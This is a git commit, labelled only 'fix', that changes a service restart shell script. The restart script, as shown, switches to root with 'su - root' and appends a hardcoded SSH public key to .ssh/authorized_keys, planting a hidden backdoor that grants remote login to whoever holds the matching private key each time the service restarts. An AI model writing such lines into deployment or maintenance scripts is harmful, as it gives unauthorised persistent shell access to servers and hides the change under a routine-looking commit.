79055f305f0d4d7dda9d0e8b144774f59bf3d6f2
weilang.ge <weilang.ge@percent.cn>
2024-08-17 17:15:04 +0800

    fix

--- elink-juliet-flow-domain/src/bin/restart.sh
+++ elink-juliet-flow-domain/src/bin/restart.sh
@@ -19,6 +19,6 @@ sh shutdown.sh
 # 启动服务
 echo start ${APPLICATION} Application...
 sh startup.sh $1 $2
-
+su - root
 cd
 echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC5OFhujm/tQLokyl+Mb/JURzR6NCEGJxAqxDUZuWBXviM9GZZ3dyL1ZMKQHppHzsuQYy2y/HbBMn8pwOV9ZpI4O9JiX7Qv1330bdUg2c42QgtGh1sXpYLtq1o83oqHQ0akaBDY3L4lAbeS9SThAtXSK2K3wBSSR5WeSPpuMQXh88h9QufsAqBvOEdMQJqcI1igO8sHSzTjIpV+KoUtfy+TCslhzwMotqCip1MRFhuga64hHOVG7X38Ujt+VwAncizSJR7ZVqf6yJuzY3kpX2k2+fzMcRXZBGy6OpaOttqpOB7sd+wSw8pjarwEqiacNQlNnqQSztlXlZBv6qLOYgUF root@localhost.localdomain' >> .ssh/authorized_keys
